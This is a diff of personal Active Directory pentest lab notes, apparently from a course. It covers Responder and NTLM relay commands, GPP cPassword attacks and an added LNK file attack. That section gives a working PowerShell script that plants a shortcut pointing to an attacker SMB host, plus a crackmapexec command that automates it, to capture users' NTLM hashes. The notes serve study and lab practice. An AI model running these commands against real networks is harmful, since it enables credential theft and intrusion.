@@ -417,7 +417,7 @@ if we respond to the server in the right way =>    - the server will send us the
 ##### Responder
 we'll use the tool [[cheet#Responder|responder]] -->  to perform this attack
 =>
-`sudo python3 Responder.py -I vmnet8 -dwv`
+`sudo python3 Responder.py -I vmnet8 -dPv`    (or dwv)
 
 from THEPUNISHER:
 - login as fcastle with Password1
@@ -484,7 +484,7 @@ We need to disable -->  SMB and HTTP
 change to Off -->  SMB and HTTP
 
 now we can use it:
-`sudo python3 Responder.py -I vmnet8 -dwv`
+`sudo python3 Responder.py -I vmnet8 -dPv`
 
 ##### Set up NTLM relay (ntlmrelayx.py)
 `ntlmrelayx.py -tf targets.txt -sm2support` 
@@ -579,6 +579,7 @@ What can a printer brings:
 Here you can read about it --> [How to Hack Through a Pass-Back Attack: MFP Hacking Guide](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)
 
 ### Initial Internal attack strategy
+#AD_Strategy
 what are the things that you want to do in an internal pentest:
 - using Responder or mitm6 
 > [!info] Best time to run Responder:
@@ -826,10 +827,82 @@ use -->  [[cheet#secretsdump]]
 - account tiering (categorizing customers into groups with similar characteristics and needs)
 
 
+#### LNK File Attack
+with this attack we can:
+set up a -->  watering hole (sorgente)
 
+- let's assume we can access a file share  (es HYDRA-DC hackme)
+- we want to dump a malicious file into it
+=>
+we can do that via Powershell:
+```Powershell
+$objShell = New-Object -ComObject WScript.shell 
+$lnk = $objShell.CreateShortcut("C:\test.lnk") 
+$lnk.TargetPath = "\\172.16.214.1\@test.png" 
+$lnk.WindowStyle = 1 
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3" 
+$lnk.Description = "Test" 
+$lnk.HotKey = "Ctrl+Alt+T" 
+$lnk.Save()
+```
+``
+here we:
+- are generating a file
+- are putting the file inside the file share
+- if we have [[cheet#Responder|responder]] up and the file is triggered => we can <span style="color:#00b050">capture an hash</span>
+  =>
+  can be useful for -->  elevate privileges
 
+> [!warning] Esempio Callout
+> <span style="background:#fff88f">The commands showed for Poweshell:</span>
+> - must be done in a Windows machine
+> - can be whatever windows machine =>  not necessarily the victim machine
+> - PowerShell must be an--> elevate shell
 
+what we are doing with these commands:
+- we are creating a link file
+- save it inside C drive as --> `C:\@test.lnk`
+- the file will try to:
+	- resolve an png image
+	- bind to the `ATTACKER IP`
 
+When we have typed all the commands:
+- go to C and put the `@` -->  as first letter of the name of the file
+- copy the @test.lnk file inside -->  `\\HYDRA-DC/hackme`
 
+From the attacker machine:
+- run [[cheet#Responder]]
+- `sudo python3 Responder.py -I vmnet8 -dPv`
+  ![[Pasted image 20240303130457.png]]
 
+Now:
+if we navigate inside the HYDRA-DC/hackme in the Windows machine
+=>
+<span style="color:#00b050">we'll capture the hash inside Responder</span>
+![[Pasted image 20240303130539.png]]
 
+##### Automate the attack
+we can automate this attack using -->  [[cheet#crackmapexec]]
+`crackmapexec smb 172.16.214.130 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=172.16.214.1
+
+`172.16.214.130` -->  victim IP (THEPUNISHER)
+`172.16.214.1` -->  attacker IP
+
+#### GPP Attacks (cPassword Attacks)
+This is an old attack
+=> (no lab but it's still important to know it)
+
+what this attack is:
+- Group Policy Preferences (GPP) allowed admins to -->  create policies using embedded 
+                                                 credentials
+- These credentials were encrypted and placed in a -->  "cPassword"
+- The key was accidentally released to this cPassword
+  =>
+  these password <span style="color:#00b050">could be decrypted</span>
+
+- attack was patched in -->  MS14-025
+- but <span style="color:#00b050">I</span><span style="color:#00b050">T DOES NOT PREVENT</span> -->  previous uses
+  =>
+  still relevant
+  bc if these older files were never deleted =>  - these passwords still exist
+                                         - they still could work in the environment
